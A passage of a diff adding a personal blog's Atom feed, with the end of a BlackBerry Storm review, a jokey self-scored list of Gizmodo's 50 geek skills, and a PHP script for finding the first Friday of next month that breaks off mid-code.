+&lt;p&gt;&lt;img alt="BlackBerry Maps" src="{filename}/images/blackberry-storm-unboxing/blackberry-maps.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;I’ve now had my Storm for just over 3 weeks and I love it! Every aspect of it is
+great. Sure there are some problems with the software, but nothing major or
+inconvinient, and since it’s software, there’s a good chance it will be fixed in
+the near future. Bottom line though, I don’t know how I lived without a
+BlackBerry up until now!&lt;/p&gt;</summary><category term="9530"></category><category term="BlackBerry Storm"></category><category term="Smart Phone"></category><category term="Touch Screen"></category><category term="Verizon Wireless"></category></entry><entry><title>How Geek am I?</title><link href="http://blog.chriskankiewicz.com/how-geek-am-i.html" rel="alternate"></link><published>2008-11-08T00:00:00-07:00</published><author><name>Chris Kankiewicz</name></author><id>tag:blog.chriskankiewicz.com,2008-11-08:how-geek-am-i.html</id><summary type="html">&lt;p&gt;So, Gizmodo had a list of 50 skills every geek should know. Seeing as I choose
+to don the title of “Geek” I feel obligated to see how many of these skills I
+posses.&lt;/p&gt;
+&lt;p&gt;Skills marked in &lt;strong&gt;Bold&lt;/strong&gt; are skill I have and have used, or have all the
+essential knowledge to perform without reference. My notes are [encased in
+square brackets].&lt;/p&gt;
+&lt;p&gt;View the original article @
+&lt;a href="http://gizmodo.com/5078829/the-50-skills-every-geek-should-have"&gt;http://gizmodo.com/5078829/the-50-skills-every-geek-should-have&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Check out the list after the break.&lt;/p&gt;
+&lt;h2&gt;The List&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Install a hard drive in a laptop&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Perform a clean OS install on a machine with two OSes&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Swap out the battery on your iPod/iPhone&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Jailbreak an iPhone&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Wire your house for Ethernet and Coax cable&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Use BitTorrent and RSS to automatically download new shows from
+     trackers&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Use an A/V receiver to its fullest capability (every port is
+     taken)&lt;/strong&gt; [with the right equipment]&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Calibrate an HDTV without the manual&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Use a DSLR in full manual mode&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Hack the encryption and mooch your neighbor’s Wi-Fi&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Solder cleanly enough to get around a circuit board&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Use your 3G phone as a Wi-Fi access point&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Shove the guts of a modern game console into a retro game console&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Design a webpage in HTML by hand that features a picture of your cat&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Use Photoshop to imperceptibly doctor a photo&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Abstain from buying extended warranties&lt;/strong&gt; [a definite must for a geek]&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Know where to buy cheap cables and accessories&lt;/strong&gt; [newegg.com is a good
+      start]&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Fix your parents’ computer over the phone without looking at a
+      computer&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Enter the Konami code&lt;/strong&gt; [Up Up Down Down Left Right Left Right B A
+      Start]&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Comment on Gizmodo from your phone&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Type quickly using T9 texting&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Program a universal remote&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Contribute code to the Linux kernel&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Hide porn from your significant other&lt;/strong&gt; [though I'd prefer to share it
+      with her ;-) ]&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Avoid DRM on everything&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Know how to back up your data to networked storage - and actually do
+      it&lt;/strong&gt; [set this up on a scheduled task]&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Watch TV shows on the internet for free&lt;/strong&gt; [hulu.com, BOOM BABY!]&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Edit together digital video ripped from YouTube&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Play any SNES game on your computer through an emulator&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Reset expired trial software by messing with the registry&lt;/strong&gt; [been a
+      while, but have done this]&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Hackintosh your PC&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Download pre-release movies from Usenet&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Hack the Wii to play homebrew games&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Get around web content filters on public computers&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Get into a Windows computer if you forgot your password&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Securely erase your data so it can’t be recovered&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Share a printer between a Mac and a PC on a network&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Build a fighting robot&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Write your own Firefox plugins&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Navigate and reorganize the files on your computer in DOS&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Get something on the front page of Digg&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Get through to executive customer service&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Rip a CD to V0 quality MP3s&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Rip a DVD to DivX&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Build your own computer from parts&lt;/strong&gt; [there is no other way]&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Swap out the hard drive in your DVR for a bigger one&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Get an NES cartridge working again by blowing in it&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Calibrate a 7.1 surround-sound system&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Play downloaded games on a Nintendo DS&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Talk about things that aren’t tech related&lt;/strong&gt; [possible, but difficult]&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;30 out of 50… not too bad I guess, though I’m sure a simple Google search or two
+and I’d have the knowledge most of these other skills require.&lt;/p&gt;
+&lt;p&gt;Examples:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="http://www.google.com/search?q=Rip+a+CD+to+V0+quality+MP3s"&gt;http://www.google.com/search?q=Rip+a+CD+to+V0+quality+MP3s&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://www.google.com/search?q=Hack+the+Wii+to+play+homebrew+games"&gt;http://www.google.com/search?q=Hack+the+Wii+to+play+homebrew+games&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Now that’s where the true test of a Geek lies, in his ability to find solutions
+where he has none, aka Google-fu.&lt;/p&gt;</summary><category term="Geek"></category><category term="Gizmodo"></category><category term="Google-fu"></category><category term="Konami Code"></category></entry><entry><title>Calculate the first Friday of next month with PHP</title><link href="http://blog.chriskankiewicz.com/calculate-the-first-friday-of-next-month-with-php.html" rel="alternate"></link><published>2008-10-20T00:00:00-07:00</published><author><name>Chris Kankiewicz</name></author><id>tag:blog.chriskankiewicz.com,2008-10-20:calculate-the-first-friday-of-next-month-with-php.html</id><summary type="html">&lt;p&gt;&lt;strong&gt;UPDATE:&lt;/strong&gt; This script has been updated, see:
+&lt;a href="https://github.com/PHX2600/FirstFriday"&gt;https://github.com/PHX2600/FirstFriday&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;While developing phx2600.org, I ran into a slight dilemma. The PHX2600 meetings
+occur once a month on the first Friday of every month, and we wanted to display
+that on the site. However, it was becoming a tedious chore to change the date
+once a month manually. So, being the automation addict I am, I thought, why not
+write a script. So one night I hammered out the following script that will
+calculate the first Friday of next month:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
+
+    &lt;span class="sd"&gt;/***************************************&lt;/span&gt;
+&lt;span class="sd"&gt;     * FILENAME: first-friday.php          *&lt;/span&gt;
+&lt;span class="sd"&gt;     * AUTHOR: Chris Kankiewicz [PHLAK]    *&lt;/span&gt;
+&lt;span class="sd"&gt;     * WEBSITE: http://www.web-geek.net    *&lt;/span&gt;
+&lt;span class="sd"&gt;     ***************************************/&lt;/span&gt;
+
+    &lt;span class="c1"&gt;// START FUNCTIONS&lt;/span&gt;
+
+    &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;get_day&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$describer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$weekday&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$reference_date&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;// $reference_date format = m-Y&lt;/span&gt;
+
+        &lt;span class="nv"&gt;$d&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;explode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$reference_date&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+        &lt;span class="k"&gt;switch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$describer&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;first&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nv"&gt;$offset&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;get_day_offset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$reference_date&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$weekday&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+            &lt;span class="k"&gt;break&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+
+        &lt;span class="nv"&gt;$r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;mktime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$d&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nv"&gt;$offset&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$d&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$r&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;//returns timestamp format&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+
+    &lt;span class="k"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;get_day_offset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$anchor&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$target&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="c1"&gt;//$anchor format = m-Y&lt;/span&gt;
+
+        &lt;span class="nv"&gt;$ts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;explode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$anchor&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="nv"&gt;$ts&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;mktime&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$ts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;01&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$ts&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
+
+        &lt;span class="nv"&gt;$anchor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;w&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$ts&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="nv"&gt;$target&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;strtolower&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$target&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="nv"&gt;$days&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
+            &lt;span class="s1"&gt;&amp;#39;sunday&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+            &lt;span class="s1"&gt;&amp;#39;monday&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+            &lt;span class="s1"&gt;&amp;#39;tuesday&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+            &lt;span class="s1"&gt;&amp;#39;wednesday&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+            &lt;span class="s1"&gt;&amp;#39;thursday&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+            &lt;span class="s1"&gt;&amp;#39;friday&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
+            &lt;span class="s1"&gt;&amp;#39;saturday&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;
+        &lt;span class="p"&gt;);&lt;/span&gt;
+
+        &lt;span class="nv"&gt;$offset&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nv"&gt;$days&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$target&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="nv"&gt;$anchor&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$offset&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="nv"&gt;$offset&lt;/span&gt;&lt;span class="o"&gt;+=&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nv"&gt;$offset&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="c1"&gt;//returns 0-6 for use in get_day();&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+
+    &lt;span class="c1"&gt;//END FUNCTIONS&lt;/span&gt;
+
+    &lt;span class="nv"&gt;$t&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;getdate&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="c1"&gt;//Get today&amp;#39;s date&lt;/span&gt;
+
+    &lt;span class="nv"&gt;$today&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;m-Y&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$t&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt; &lt;span class="c1"&gt;//Display today&amp;#39;s date as MM-YYYY&lt;/span&gt;
+
+    &lt;span class="c1"&gt;//Calculate Next Month&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$t&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mon&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;12&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
+        &lt;span class="nv"&gt;$nm&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;1-&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$t&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;year&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;elseif&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$t&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mday&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;7&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nv"&gt;$t&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;wday&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;5&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="nv"&gt;$nm&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$t&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mon&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$t&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;year&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+        &lt;span class="nv"&gt;$nm&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$t&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mon&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="nv"&gt;$t&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;year&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+
+    &lt;span class="nv"&gt;$date&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;get_day&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;first&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;friday&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$nm&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+
+    &lt;span class="c1"&gt;//Checks if today is after the first friday of the month&lt;/span&gt;
+    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$t&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mon&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;m&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$date&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nv"&gt;$t&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mday&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="nb"&gt;date&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;j&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nv"&gt;$date&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+        &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nv"&gt;$t&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mon&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;12&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+            &lt;span class="nv"&gt;$nm&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;1-&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$t&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;year&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+            &lt;span class="nv"&gt;$ff&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;get_day&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;first&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;friday&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$nm&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
